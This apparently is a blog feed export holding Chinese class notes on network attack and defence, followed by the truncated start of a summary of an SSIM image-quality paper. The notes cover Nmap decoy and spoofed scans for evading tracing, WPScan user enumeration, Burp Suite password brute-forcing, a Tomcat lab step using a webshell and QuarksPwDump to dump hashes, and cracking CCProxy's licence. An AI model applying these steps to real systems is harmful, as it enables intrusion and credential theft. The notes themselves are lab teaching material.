href="https://开头的WEB网站，SSL的标准端口为443" target="_blank" rel="noopener">https://开头的WEB网站，SSL的标准端口为443</a></strong></p><p>HTTP CONNECT代理</p><p>用户向代理发起HTTP CONNECT请求，代理为用户建立连接到目标的任何端口</p><p>HTTP TUNNEL代理</p><p>与HTTP CONNECT代理类似，但是转发隧道报文，通常是加密的SSL通信</p><p>FTP代理</p><p><strong>代理FTP客户机软件访问FTP服务器，其端口一般为21、2121</strong></p><p>POP3代理</p><p><strong>代理邮件客户机软件用POP3协议收邮件，其端口一般为110</strong></p><p>Telnet代理</p><p><strong>代理Telnet客户程序访问Telnet服务器，用于远程控制和管理，其端口一般为23</strong></p><p>Socks代理</p><p><strong>防火墙安全会话转换协议，介于应用层和传输层之间的“中介层”，其标准端口为1080</strong></p><p>Socks4只支持TCP应用，而Socks5可支持TCP和UDP两种应用。</p><p><strong>如何使用代理</strong></p><p>http: google 设置-&gt;高级-&gt;局域网设置-&gt;代理服务器-&gt;代理ip 端口号 </p><p>sock:设置-&gt;高级-&gt;局域网设置-&gt;代理服务器-&gt;套接字</p><p>代理服务器使用自行查找</p><h5 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h5><p>免费WEB安全扫描器，集成HTTP和HTTPS的代理服务器，仅支持正向代理功能</p><p>apt-get install zaproxy</p><p>zaproxy //运行</p><p>点击上方菜单栏Tools-&gt;Local Proxies（用来搭建本地http/https代理） -&gt;地址改为kali的ip,不能写localhost(127.0.0.1)，localhost私有地址别人无法使用，端口默认8080或者自行修改</p><p>使用另个设备通过Kali搭建的服务器上网，火狐-&gt;选项-&gt;网络设置-&gt;手动设置代理服务器(http/https代理都可以使用) ,看使用的浏览器能否上网确认代理是否成功</p><h5 id="CCProxy"><a href="#CCProxy" class="headerlink" title="CCProxy"></a>CCProxy</h5><p>国内出品的Windows代理软件，支持正向和反向代理</p><p>安装ccproxy 默认安装-&gt;破解ccproxy</p><p>破解:选择离线注册 复制特征码到破解工具machine ID处generate</p><p> 使用:<br>设置中使用了多种代理方式，例如选择http,填写自己的ip</p><p>为了安全可以在账号管理中只对某些人开放或对所有开放(对所有人开放采用匿名访问)</p><p>做了修改后先停用再重启，使配置生效</p><p>使用http/https  代理服务器上CCProxy记录哪个机器访问了哪个网站</p><p>因为需要用户在浏览器设置，所以不是透明代理</p><h5 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h5><p>ProxyChains可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。</p><p> 只有一级代理，对用户隐藏的并不好。如果有多级代理，对用户来说相对安全。</p><p>ProxyChains 支持多个代理组成链式访问：</p><p>your_host &lt;—&gt; proxy 1 &lt;—&gt; proxy 2 (HTTP or SOCKS4/5) &lt;—&gt; target_host</p><p>使用跨不同国家(对上网法律不同)，对请求方来说是安全的。</p><p><strong>配置:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf //在proxychains配置文件中添加多个代理的IP和端口</span><br></pre></td></tr></table></figure><p>dynamic_chain 动态链</p><p>写出多个代理 动态在里面进行选择</p><p>strict_chain</p><p>严格的按照你写出代理的顺序进行代理</p><p>还有一种随机的代理</p><p>proxy_dns 进行注释，我们使用自己代理的dns</p><p>在ProxyList写出代理列表</p><p>格式: 代理方式  ip 端口</p><p>例如</p><p>Proxy List:</p><p>https  192.168. .  808  (CCProxy)</p><p>http 192.168.3.75 8888(ZAP)</p><p>注意设置浏览器为不使用代理(把之前设置的删掉)</p><p><strong>用法：</strong></p><p>proxychains curl <a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a> //curl 文件传输</p><p>curl:把对方的页面存成文件</p><p>proxychains wget 目标</p><p>wget:用文本方式访问网站</p><p>proxychains firefox <a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a></p><p>firefox:用火狐浏览器访问目标</p><p><strong>涉及到需要证书的(https需要)不太好用，在http比较好使用</strong>  </p><h2 id="class4-1"><a href="#class4-1" class="headerlink" title="class4"></a>class4</h2><h3 id="网络扫描-1"><a href="#网络扫描-1" class="headerlink" title="网络扫描"></a>网络扫描</h3><p>基于网络的远程服务发现和系统脆弱点检测的一种技术。</p><p><strong>基于主机的扫描</strong></p><p>被动式策略或系统安全扫描</p><p>运行在被扫描主机之上，对系统中错误的配置、脆弱的口令和其它不符合安全策略的设置进行检测</p><p><strong>基于网络的扫描</strong></p><p>主动式策略</p><p>向远程主机发送探测数据包，获取响应数据包并对其进行解码分析，从而发现网络或主机的各种漏洞</p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>功能:躲避防火墙、主机发现、端口扫描、版本侦测、操作系统侦测、Nmap脚本搜索引擎</p><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><p>用于发现目标主机是否在线（Alive，处于开启状态）</p><p>与Ping命令类似，发送探测包到目标主机，若收到回复，说明目标主机是开启的。多种主机探测方式，比如发送ICMP ECHO/ TIMESTAMP /NETMASK报文、发送TCP SYN/ACK包、发送SCTP INIT/COOKIE-ECHO包。</p><p>我们平时使用的ping就是使用了ICMP的ECHO REQUEST报文。</p><p>用法:</p><ul><li><p>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 </p><p>(扫描列表，把扫描的地址段列出来，但主机存不存活不显示，在日常生活中基本不用)</p></li><li><p>-sn: Ping Scan <strong>只进行主机发现</strong>，不进行端口扫描。 </p></li><li><p>-Pn: 跳过主机发现而进行端口扫描等高级操作。 </p></li><li><p>-PS/PA/PU/PY[portlist]: 使用TCP SYN/ACK或SCTP INIT/ECHO方式进行主机发现。(用的选项不一样，结果也会有所不同) </p></li><li><p>-PO[protocollist]: 使用IP协议包探测对方主机是否开启。 </p></li><li><p>-n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。 </p></li><li><p>—dns-servers <serv1[,serv2],...>: 指定DNS服务器。 </serv1[,serv2],...></p></li><li><p>—system-dns: 指定使用系统的DNS服务器 </p></li><li><p>—traceroute: 追踪每个路由节点(一些节点路由器不显示ip是因为路由器限制了报文的通过，做了过滤)</p></li></ul><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>TCP从0-65535共六万多个端口。其中一些为特定服务提供，大部分是动态的。端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。 默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。</p><p>两种扫描方式:TCP端口扫描(全连接扫描(Connect扫描)、半连接扫描(SYN扫描)、FIN扫描、ACK扫描、NULL扫描、TCP窗口扫描、自定义扫描)/UDP端口扫描</p><h6 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h6><p>端口:一个服务点，位于传输层和应用层之间。通过端口和应用层的一些协议连接起来。</p><div class="table-container"><table><thead><tr><th><strong>服务</strong></th><th><strong>端口号</strong></th></tr></thead><tbody><tr><td>HTTP</td><td>80</td></tr><tr><td>HTTPS</td><td>443</td></tr><tr><td>Telnet</td><td>23</td></tr><tr><td>FTP</td><td>21</td></tr><tr><td>SSH（安全登录）</td><td>22</td></tr><tr><td>SMTP</td><td>25</td></tr><tr><td>POP3</td><td>110</td></tr><tr><td>WebLogic</td><td>7001</td></tr><tr><td>TOMCAT</td><td>8080</td></tr><tr><td>WIN2003远程登录</td><td>3389</td></tr><tr><td>Oracle数据库</td><td>1521</td></tr><tr><td>MS SQL* SEVER数据库sever</td><td>1433</td></tr><tr><td>MySQL 数据库sever</td><td>3306</td></tr></tbody></table></div><h6 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h6><div class="table-container"><table><thead><tr><th><strong>Open</strong></th><th><strong>端口是开放的</strong></th></tr></thead><tbody><tr><td>Closed</td><td>端口是关闭的</td></tr><tr><td>filtered</td><td>端口被防火墙IDS/IPS屏蔽，无法确定其状态</td></tr><tr><td>unfiltered</td><td>端口没有被屏蔽，但是否开放需要进一步确定</td></tr><tr><td><strong>open</strong>\</td><td>filtered</td><td>端口是开放的或被屏蔽</td></tr><tr><td>closed\</td><td>filtered</td><td>端口是关闭的或被屏蔽</td></tr></tbody></table></div><h6 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h6><p>1.TCP协议格式</p><p>主要介绍六个特殊字段，都占有一个比特位</p><p>URG:紧急数据指针。等于1指针字段有效。</p><p>ACK:应答  PSH:数据推送方式 RST:复位 SYN:同步，建立连接时用 FIN:终止连接</p><p>2.SYN扫描</p><p>（-sS）半开放扫描</p><p><strong>一般使用半开放SYN扫描</strong></p><p>发送SYN到目标端口，如果收到SYN/ACK回复，端口是开放的；正常情况第三次握手回送ACK，但因为是半开放扫描,直接复位中断连接（图1）</p><p>如果收到RST包，说明该端口是关闭的。（图2）</p><p>如果<strong>没有收到回复</strong>，判断该端口被屏蔽（Filtered，防火墙）。</p><p>仅发送SYN包到目标主机的特定端口，不建立的完整的TCP连接，相对比较隐蔽，效率比较高，适用范围广。 </p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210328082613234.png" alt="image-20210328082613234">使用wireshark抓包过滤条件 进行分析</p><p>ip.addr\==目标 and ip.addr\==自己 and tcp.port==扫描端口</p><p>3.TCP扫描</p><p>（-sT）全扫描  三次握手</p><p>使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭（如无防火墙，回复RST，图1；有防火墙，什么也收不到，图2）。能建立连接，则端口打开，完成三次握手后断开连接（图3）</p><p>故若能建立连接，wireshark抓包应该是四个报文</p><p>该方式扫描速度比较慢，而且由于<strong>建立完整的TCP连接会在目标机上留下记录信息</strong>，不够隐蔽。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210328084155187.png" alt="image-20210328084155187"></p><p>4.ACK扫描</p><p>向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽（用于判断防火墙设置，图1）</p><p>没有收到RST包，说明被屏蔽。（图2）</p><p><strong>只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况。</strong></p><p>ACK扫描端口多时不会都列出来。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210328084716109.png" alt="image-20210328084716109"></p><p>5.TCP FIN/Xmas/NULL scanning   </p><p>三种秘密扫描</p><p>分别向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包。</p><p>如果收到对方RST回复包，则该端口是关闭的；（图1）</p><p>没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。（图2） </p><p>Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210328085132062.png" alt="image-20210328085132062"></p><p>这个理论与实践有出入，做实验时观察。(21端口开放却收到RST包)</p><p>6.自定义TCP扫描包</p><p>—scanflags</p><p>定制一个包含ACK扫描和SYN扫描的扫描包</p><p>nmap —scanflags SYNURG 目标IP</p><h6 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h6><p>UDP端口也是0-65535范围。但时间较长，因为扫描对方全部六万端口。</p><p>向目标主机的UDP端口发送探测包，如果收到回复“ICMP port unreachable”就说明该端口是关闭的；（图1）</p><p>如果没有收到回复，那说明UDP端口可能是开放的或屏蔽的。（图2）</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210328085808188.png" alt="image-20210328085808188"></p><p>注意区分 wireshark抓包时源也向目的发出了 端口不可达。看清源与目的</p><h6 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h6><p>-sS/sT/sA/sW:指定使用 TCP SYN/Connect()(全连接扫描)/ACK/Window(滑动窗口扫描)方式来对目标主机进行扫描。 </p><p>-sU: 使用UDP扫描方式确定目标主机的UDP端口。 </p><p> -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。</p><p> -sF   不受防火墙和IDS的限制</p><p> —scanflags <flags>: 定制TCP包的flags。  </flags></p><p> -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。 </p><p> -sO: 使用IP protocol 扫描确定目标机支持的协议类型。 </p><p> -b <FTP relay host>: 使用FTP bounce scan扫描方式</FTP></p><h6 id="端口参数与扫描顺序"><a href="#端口参数与扫描顺序" class="headerlink" title="端口参数与扫描顺序"></a>端口参数与扫描顺序</h6><p>-p <port ranges>: 扫描指定的端口 </port></p><p>​     实例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9（其中T代表TCP协议、U代表UDP协议、S代表SCTP协议） </p><p>查看地址段中哪些主机用到了你熟悉攻击的服务<code>nmap -sS 192.168.3.72/25 -p80,21,445</code>扫描多个端口时用逗号隔开    </p><p>-F: Fast mode – 快速模式，仅扫描TOP 100的端口 </p><p> -r: 按端口有序扫描（<strong>如无该参数，随机顺序方式扫描端口</strong>）。 </p><p> —top-ports <number>:扫描开放概率最高的number个端口。默认情况下，nmap会扫描最有可能的1000个TCP端口）</number></p><p> —port-ratio <ratio>: 扫描指定频率以上的端口。参数必须在在0到1之间。</ratio></p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p>不要随意Nmap目标。nmap已经入了刑法，许多单位把端口扫描视为恶意行为，测试Nmap最好在内部网络进行。如有必要，应该告诉同事你正在试验端口扫描，因为扫描可能引发IDS警报以及其他网络问题。</p><p>对于管理员来说，定期进行扫描，关闭不必要的服务。根据Nmap提供的报告，关闭不必要的服务，或者调整路由器的访问控制规则（ACL），禁用网络开放给外界的某些端口。</p><h5 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h5><p>确定目标主机开放端口上运行的具体的应用程序及版本信息，不同版本对应的漏洞类型不同。</p><p>•首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p><p>•如果是TCP端口，尝试建立TCP连接。接收到目标机发送的“WelcomeBanner”信息（相当于身份）。nmap将接收到的Banner与nmap-services-probes(nmap的签名库)中的签名进行对比。查找对应应用程序的名字与版本信息。</p><p>•如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p><p>-sV: 指定让Nmap进行版本侦测  </p><p>nmap  -sV 目标</p><p>不加任何选项: port state service</p><p>加sV选项要比不加时间长，因为要将Banner和自己的库进行比对</p><h5 id="扫描操作系统类型"><a href="#扫描操作系统类型" class="headerlink" title="扫描操作系统类型"></a>扫描操作系统类型</h5><p>利用系统数据库nmap-os-db，可以识别2600多种操作系统与设备类型。</p><p>原理:</p><p>利用TCP/IP协议栈指纹来识别不同的操作系统和设备。</p><p>分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。</p><p>将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。<strong>如果无法匹配，以概率形式列举出可能的系统。</strong></p><p>-O: 指定Nmap进行OS侦测</p><h5 id="假冒扫描"><a href="#假冒扫描" class="headerlink" title="假冒扫描"></a>假冒扫描</h5><p>修改扫描的源。</p><p>•nmap -e eth0 -S 源IP地址 IP地址</p><p>同时使用被扫主机wireshark抓包，查看源ip是否被修改。在扫描主机wireshark上抓包，也显示伪造ip</p><p>•namp -D IP地址1,IP地址2,…,ME IP地址</p><p>使用一个地址池 ME指kali地址(在命令中写ME即可)，使用这些地址对目标进行扫描。这样做的目的是虽然有日志记录，溯源时不知道哪个ip是扫描源。用逗号进行分割</p><p>•nmap —data-length 垃圾数据长度 IP地址</p><p>常规扫描的数据包是特定数据长度的。</p><p>通过在发送的数据包末尾添加随机的垃圾数据，以达到混淆视听的作效果。</p><p>•nmap —randomize-hosts IP地址段 </p><p>打乱扫描顺序，以规避检测系统的检测。</p><p>不涉及假冒源，扫描一个地址段，如果加上这个选项，扫描时无序，不会引起管理员的注意。</p><h3 id="Unicornscan扫描"><a href="#Unicornscan扫描" class="headerlink" title="Unicornscan扫描"></a>Unicornscan扫描</h3><p>apt-get install unicornscan</p><h4 id="TCP-SYN扫描"><a href="#TCP-SYN扫描" class="headerlink" title="TCP SYN扫描"></a>TCP SYN扫描</h4><p>unicornscan -v -I 目标  v详细输出；I立即执行</p><p>不加-v没有端口 信息</p><h4 id="特定协议的扫描"><a href="#特定协议的扫描" class="headerlink" title="特定协议的扫描"></a>特定协议的扫描</h4><p>unicornscan -mT 目标(T代表TCP)</p><p>扫描模式是默认的TCP（SYN）扫描，</p><ul><li><p>U表示UDP -mU</p></li><li><p>T表示TCP连接扫描</p></li><li><p>A表示ARP</p></li></ul><h4 id="指定端口的扫描"><a href="#指定端口的扫描" class="headerlink" title="指定端口的扫描"></a>指定端口的扫描</h4><p>unicornscan  -mT -v -I [IP地址]/24:端口</p><h3 id="Metasploit之扫描"><a href="#Metasploit之扫描" class="headerlink" title="Metasploit之扫描"></a>Metasploit之扫描</h3><p>msfconsole</p><p>search portscan(搜索出八个模块)</p><p>use auxiliary/scanner/postscan/tcp</p><p>show options(默认扫描端口1-10000)</p><p>set rhosts 地址段或地址</p><p>run</p><h3 id="WEB漏洞扫描工具"><a href="#WEB漏洞扫描工具" class="headerlink" title="WEB漏洞扫描工具"></a>WEB漏洞扫描工具</h3><h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><p>对WEB服务器程序(目标网站)进行已知漏洞扫描</p><p>集成著名的WEB程序漏洞扫描插件</p><p>apt-get install nikto</p><p>漏洞类型:</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210331122822518.png" alt="image-20210331122822518"></p><p>使用时加载不同的扫描模块，即前面的漏洞类型</p><p>nikto -host 192.168.3.44 -T(加载扫描策略) 23456789</p><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><ul><li><p>与nikto等工具有相似的功能</p></li><li><p>占用较低的CPU资源，运行速度比较快</p></li></ul><p>apt-get install skipfish</p><p>也有具体扫描的模块</p><p>skipfish —checks 查看帮助以及对应漏洞类型</p><p>skipfish -o text <a href="http://192.168.1.101" target="_blank" rel="noopener">http://192.168.1.101</a> -o输出到文件</p><p>在控制台中查看Issue found  1warn 2low(低危) 无详细信息</p><h2 id="class7-Burpsuite暴力破解"><a href="#class7-Burpsuite暴力破解" class="headerlink" title="class7 Burpsuite暴力破解"></a>class7 Burpsuite暴力破解</h2><p>wamp</p><ul><li>wordpass omp/root</li><li>数据库 phpadmin root/root</li></ul><p>phpstudy</p><ul><li>数据库 phpadmin root/root</li><li>dvwa  admin  ？        </li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>相对于wampserver,phpstudy轻量级，适用于小型应用</p><h4 id="wamp"><a href="#wamp" class="headerlink" title="wamp"></a>wamp</h4><p>同一端口配多个网站 则放到wamp64/www下 每个网站创建一个目录</p><p>网站主页对应为 www文件夹下的index.php</p><p>同一端口访问多个网站直接url加入子文件夹名</p><p>使用phpmyadmin进行配置数据库(IE打不开 不能进行后续操作) 默认 root/空 (本机数据库账密root/root)</p><p>账户-&gt;修改数据库用户密码  新建一个数据库(wordpress登录时需要)</p><p>不同端口搭建网站 配置httpd.conf(http协议进程) Listen 0.0.0.0:端口(ipv4) 设置不同端口号</p><p>配置httpd-vhosts.conf  修改端口和DocumentRoot</p><p>配置文件修改后 重启wamp的所有服务</p><h4 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h4><p>对dvwa/config下文件 config.inc.php进行修改</p><p>修改数据库名 数据库用户名 数据库密码</p><p>default_secutiry_level 修改安全等级为low</p><p>进入dvwa先进行安装 setup.php</p><p>对环境变量进行检查 若出现红色 进行相应修改 如修改php.ini相应值</p><p>创建数据库 Create Database</p><p>解决其他主机不能访问网站问题:</p><p>打开apache的httpd.conf httpd-vhosts.com</p><p>把Required all denied loacal改为 Require all granted </p><h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h3><p>专门扫描WordPress漏洞的黑盒子扫描器</p><p>可以通过插件/主题漏洞进行渗透</p><p>目录扫描</p><p>wpscan —url 检测到的WordPress</p><p>枚举用户</p><p>wpscan —url url —enumerate u</p><p>使用字典</p><p>wpscan —url url —enumerate u -P 字典路径</p><p>搜索主题</p><p>wpscan —url url —enumerate t(主题)</p><p>发现主题有漏洞</p><p>wpscan —url url —enumerate vt(主题)</p><p>注意:此处kali连不上物理机是因为防火墙问题(虚拟机不能ping物理机,物理机能ping虚拟机)，关闭即可</p><h3 id="CMS扫描"><a href="#CMS扫描" class="headerlink" title="CMS扫描"></a>CMS扫描</h3><p>Content Manager System(内容管理系统) 即后台</p><h4 id="cmseek"><a href="#cmseek" class="headerlink" title="cmseek"></a>cmseek</h4><p>cmseek apt-get install cmseek</p><p>www.exploit-db.com 查看各CMS漏洞</p><p>用法: cmseek</p><p>输入网址进行检测CMS类型</p><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>PC机向服务器发送请求，服务器进行响应</p><p>burpsuite在客服端和服务器之间添加代理，用户请求不是直接发给服务器，被本地代理拦截。代理做完操作，再把包发送给服务器</p><p>服务器响应给代理，代理同意后再转发给客户端。正向代理</p><h4 id="proxy模块"><a href="#proxy模块" class="headerlink" title="proxy模块"></a>proxy模块</h4><p>需要把包放行给服务器 forward</p><p>不想放行或不相关 drop</p><p>修改浏览器本地代理端口以及burp-&gt;proxy-&gt;options代理端口</p><p>最好使用不常用的端口 而不是web服务常用的8080</p><p>BP开启时需要抓包时 拦截开启(Intercept On) 不需要抓包时 拦截禁用;禁用时不影响上网行为</p><p>BP关闭时 若浏览器还设置本地代理 则无法上网</p><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>1.破解口令</p><p>抓到包后右键发送给Intruder(测试器)</p><p>对可变化的值设置$(先clear再add)</p><p>Attack type Sniper</p><p>字典中每一行填入password配合username逐条发送至服务器</p><p>Intruder-&gt;Payloads-&gt;Load 加载字典</p><p>Options 设置请求线程…</p><p>右上角start attack</p><p>返回结果能进行访问都是200</p><p>通过Length(响应长度)查看口令正确性</p><p>也可以根据服务器响应信息(错误提示)</p><p>Options-&gt;Match-&gt;Clear-&gt;Add 服务器返回错误提示 返回结果可以看到没有错误提示的信息</p><p>2.破解用户与口令</p><p>Intruder 对用户密码进行$选中</p><p><strong>Attack type </strong></p><ul><li><p>Sniper针对的场景是只有一个变量</p></li><li><p>Battering ram 针对两个变量 但是两个变量(用户名和口令)共用一个字典</p></li><li><p>Pitchfork(鱼叉式) 用于两个变量(?多个) 两个字典 </p><p>但两个字典之间是相互对应的</p><p>user1对应pass1 user2对应pass2 多余的舍弃 只按照最少的字典长度对服务器进行请求</p></li><li><p>ClusterBomb(交叉式)</p><p>user1对所有pass进行遍历</p><p>user2对所有pass进行遍历</p><p>….</p></li></ul><p>按顺序加载字典 PayloadSet 加载两个字典</p><h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><p>即使在本机上做实验，也不要使用127.0.0.1</p><p>因为127.0.0.1不经过代理 使用私有ip地址代替回环地址抓包</p><p>教师机地址及服务端口</p><p>192.168.20.253:82</p><p>虚拟机设置为桥接后 设置同一网段即可</p><p>验证码在抓包本次请求一定要输对</p><p>在本次抓包时验证码是不改变的 对用户名和密码就可以进行暴力破解</p><h4 id="Tomcat实验"><a href="#Tomcat实验" class="headerlink" title="Tomcat实验"></a>Tomcat实验</h4><p>如果需要自己搭建环境，使用低版本的tomcat7之前的(tomcat新版有登陆限制)</p><p>通过Tomcat中的大马进行RCE</p><p>扫描端口 开放远程连接端口3389</p><p>开启后建立账号并提权</p><p>远程连接到靶机提取本地管理员账号</p><p>远程cmd中进入QuarksPwDump.exe -dhl</p><p>可以得到本地账号密码的哈希值</p><p>使用网站在线破解md5或hashcat破解其本地管理员账号</p><h5 id="Basic认证"><a href="#Basic认证" class="headerlink" title="Basic认证"></a>Basic认证</h5><p>Burp中Intercept Server Respones中勾选拦截从服务器到客户端的信息 显示服务器的响应包</p><p>401未认证 放行响应包后进行后续操作</p><p>抓到登录请求包中没有看到输入的账号密码 但实际已经包含在请求包基本认证basic中(见ppt)</p><p>使用base64编码处理 在Decoder中选择base64即可</p><p>对于认证中的信息进行爆破:</p><p>发送给intruder</p><p>把编码部分加上$</p><p>payload中选择custom iterator(自定义迭代)</p><p>position1 加载用户名字典</p><p>position2 输入连接符:<br>position3 加载口令字典</p><p>在payload processing中add Encode Base64-encode</p><p>并且取消勾选有效载荷编码:URL编码这些字符</p><p>option中线程一定要改成1</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSIM(Structural SIMilarity)</title>
    <link href="/2021/04/19/SSIM/"/>
    <url>/2021/04/19/SSIM/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>SSIM( Structural SIMilarity)即图像质量评估的多尺度结构相似方法</p><p>结构相似性，一种全参考的图像质量评价指标，它分别从亮度、对比度、结构三方面<strong>度量两幅图像相似性</strong>。</p><p><img src="/2021/04/19/SSIM/einstein.png" alt="einstein"></p><p><img src="/2021/04/19/SSIM/max_ssim.gif" alt="max_ssim"></p><a id="more"></a><p>图源:<a href="https://github.com/Po-Hsun-Su/pytorch-ssim" target="_blank" rel="noopener">https://github.com/Po-Hsun-Su/pytorch-ssim</a></p><p>paper:<a href="https://www.researchgate.net/publication/4071876_Multiscale_structural_similarity_for_image_quality_assessment" target="_blank" rel="noopener">https://www.researchgate.net/publication/4071876_Multiscale_structural_similarity_for_image_quality_assessment</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>该评估方法基于假定人的视觉系统高度适应于提取场景中结构信息，因此该方法可以提供一个很好的近似来感知图片质量。论文中提出一种图像合成方法来标定定义不同尺度相关重要性的参数。</p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>使用最广泛的全参考图像质量和失真评估算法是峰值信噪比(PSNR)和均方误差(MSE)，它们与图像感知质量的相关性并不好。</p><p>传统的感知图像质量评估方法是基于自底向上的方法，试图模拟相关的早期人类视觉系统(HVS)组件的功能。这些方法通常包括</p><p>1)一个可能包含图片对齐，点向的非线性变换，模拟人眼光学的低通滤波，和颜色空间转换的预处理过程。</p><p>2)信道分解过程，把图像信号转换为不同的空间频率以及方向选择子带</p><p>3)误差归一化过程，通过合并综合在不同子带中视觉灵敏度变化以及由通道内或通道间相邻变换系数引起的视觉误差灵敏度的变化对每个子带的误差信号进行加权。</p><p>….看不下去了</p><h2 id="SINGLE-SCALE-STRUCTURAL-SIMILARITY"><a href="#SINGLE-SCALE-STRUCTURAL-SIMILARITY" class="headerlink" title="SINGLE-SCALE STRUCTURAL SIMILARITY"></a>SINGLE-SCALE STRUCTURAL SIMILARITY</h2><p>单一尺度结构相似</p><p>$X=\{x_i|i=1,2,…,N\}$  </p><p>$Y=\{y_i|i=1,2,…,N\}$</p><p>$\mu_x$为方差   $\sigma_x^2$为方差  $\sigma_{xy}$为x和y的协方差</p><p>近似可以把$\mu_x$和$\sigma_x$看成是亮度和对比度的估计，$\sigma_{xy}$ 测量了x和y一起的变化形势。论文中给出了亮度、对比度、结构相似测量:</p><p>$l(x,y)=\frac{2μ_xμ_y+c_1}{\mu_x^2+\mu_y^2+c_1}$</p><p>$c(x,y)=\frac{2\sigma_{xy}+c_2}{\sigma_x^2+\sigma_y^2+c_2}$</p><p>$s(x,y)=\frac{\sigma_{xy}+c_3}{\sigma_x\sigma_y+c_3}$</p><p>c1,c2,c3为常数  $C_1=(K_1L)^2$ $C_2=(K_2L)^2$  $C_3=C_2/2$</p><p>L为像素值的动态范围(对于8位/像素灰度图像，L = 255)  K1&lt;&lt;1 K2&lt;&lt;1 是两个标量常数</p><p>SSIM的通式被定义为:<br>$SSIM(x,y)=[l(x,y)]^α[c(x,y)]^β[s(x,y)]^γ$</p><p>我们一般设定$\alpha=\beta=\gamma=1$</p><p>故得到$SSIM(x,y)=\frac{(2\mu_x\mu_y+c_1)(\sigma_{xy}+c_2)}{(\mu_x^2+\mu_y^2+c_1)(\sigma_x^2+\sigma_y^2+c_2)}$，并且遵守</p><p>1)对称性 SSIM(x,y)=SSIM(y,x)</p><p>2)有界性 SSIM(x,y)$\le$1</p><p>3)独有的最大值 只有x=y时, SSIM(x,y)=1</p><p>通用图像指标适用于C~1~=C~2~=0的情况，这样进行参数设置的缺点是当SSIM通式中分母接近0时，测量结果变得不稳定。添加两个小常量C~1~和C~2~使这个问题很好解决(由K~1~=0.01和K~2~=0.03分别计算得到)。</p><p>我们将SSIM索引算法应用于图像质量的滑动窗口评估，窗口在整个图像空间逐像素移动。每一步，SSIM索引在当前窗口内计算。</p><p><strong>如果被比较的其中一幅图像被认为具有完美的质量，那么得到的SSIM索引图可以被视为另一幅(失真的)图像的质量图。</strong></p><p>不像在[3]中那样使用8 × 8的正方形窗口，平滑窗口方法用于当前统计，以避免在质量图中出现“blocking 